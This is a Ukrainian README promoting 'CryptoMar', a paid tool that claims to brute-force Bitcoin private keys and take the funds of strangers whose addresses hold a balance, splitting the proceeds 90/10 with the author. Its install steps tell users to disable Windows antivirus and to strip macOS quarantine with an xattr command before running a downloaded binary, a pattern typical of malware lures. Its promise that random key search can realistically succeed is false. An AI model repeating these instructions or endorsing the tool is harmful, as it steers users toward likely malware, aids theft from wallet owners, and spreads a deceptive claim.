# CryptoMar

CryptoMar — це високопродуктивний інструмент для брутфорсу Bitcoin-гаманців, заснований на власній бібліотеці на C++, оптимізований для macOS та Windows. Програма підтримує генерацію та пошук приватних ключів і Bech32 (P2WPKH) адрес Bitcoin на високій швидкості та має зручний інтерфейс, орієнтований на звичайних користувачів.
```bash
 _____________________________________________________________________
|============================= Вітаємо! ==============================|
|                             ᴄʀʏᴘᴛᴏᴍᴀʀ                               |
|============================ Версія 1.0 =============================|
|                                                                     |
|  Курс: 1 BTC = 103338 USD. (2025-05-18 00:07:01)                    |
|  Налаштування завершено.                                            |
|  Очікуйте, процес скоро почнеться...                                |
|-------------------- Завантаження адрес у памʼять -------------------|
|  Завантажено 18226528 адрес.                                        |
|---------------------------------------------------------------------|
|============================== Працює ===============================|
|                              ᴄʀʏᴘᴛᴏᴍᴀʀ                              |
|============================ Версія 1.0 =============================|
|  Процес пошуку ключів не швидкий.                                   |
|  Це займе дні або тижні.                                            |
|  Це залежить від потужності процесора та випадку.                   |
|  Додайте програму у автозавантаження, щоб не втратити шанс.         |
|_____________________________________________________________________|
|                                                                     |
| 705285.51 addresses/s            Total: 443243744                   |
```

## 🚀 Можливості

* Блискавична генерація адрес Bitcoin з використанням нативної бібліотеки на C++.
* Підтримка Bech32 (P2WPKH) Bitcoin-адрес.
* Багатопотокова генерація та перевірка наявності в базі при мінімальному використанні оперативної пам'яті.
* Актуальна база всіх існуючих P2WPKH адрес із балансом, станом на початок травня 2025 року.

## 🔓 Як це працює

### 🗝️ Генерація приватного та публічного ключа

1. Програма випадковим чином створює 256-бітне число, яке стає приватним ключем.
2. Із приватного ключа створюється публічний ключ за допомогою алгоритму еліптичної криптографії (secp256k1).
3. Публічний ключ хешується двічі (SHA-256 та RIPEMD-160), створюючи хеш (Public Key Hash), який використовується для створення Bech32 (P2WPKH) адреси.

### 🚀 Як відбувається брутфорс гаманців

1. Програма генерує мільйони приватних ключів та відповідних адрес Bech32.
2. Кожна адреса перевіряється на наявність балансу в базі даних відомих адрес із підтвердженим балансом.
3. Якщо знайдено адресу з балансом, програма зберігає приватний ключ та повідомляє користувача.

### 🌐 Скільки всього гаманців із балансом?

* На початок травня 2025 року база даних програми містить **18226528** Bech32 (P2WPKH) адрес із підтвердженим балансом > 0.00001 BTC.

## ❓ Чому автор ділиться програмою?

Брутфорс приватних ключів — це питання великої кількості часу та обчислювальних ресурсів. Автор створив програму для розподілу цього процесу між великою кількістю людей. Користувач, який підбере правильний ключ, отримує 90% коштів, а автор — 10%.

## 📥 Завантаження та запуск

### 🪟 Для Windows

1. Відключіть антивірус Windows
2. Відкрийте останній [реліз CryptoMar](https://github.com/HexaMar/CryptoMar_UA/releases/tag/v1.1.0)
3. Завантажте файл `CryptoMarInstaller.exe`.
4. Виконуйте інструкції інсталятора.

### 🍎 Для macOS

1. Відкрийте останній [реліз CryptoMar](https://github.com/HexaMar/CryptoMar_UA/releases/tag/v1.1.0)
2. Завантажте файл `CryptoMarAPP.zip`
3. Відкрийте файл `CryptoMarAPP.zip` у папці завантажень
4. Відкрийте термінал, введіть і натисніть Enter:
   ```bash
   xattr -rd com.apple.quarantine ~/Downloads/CryptoMar.app
   ```
5. Запустіть файл `CryptoMar.app` у папці завантажень

## ⚡ Платні та безкоштовні версії

* Безкоштовна версія: обмежена швидкість і час роботи (до 100 годин).
* Платна версія: необмежена швидкість і час роботи.

## 💡 Підтримка

Для отримання підтримки зв'яжіться з розробником або створіть issue на GitHub.
Перед використанням ознайомтеся з [Правилами використання](https://github.com/HexaMar/CryptoMar_UA/blob/main/README.txt).
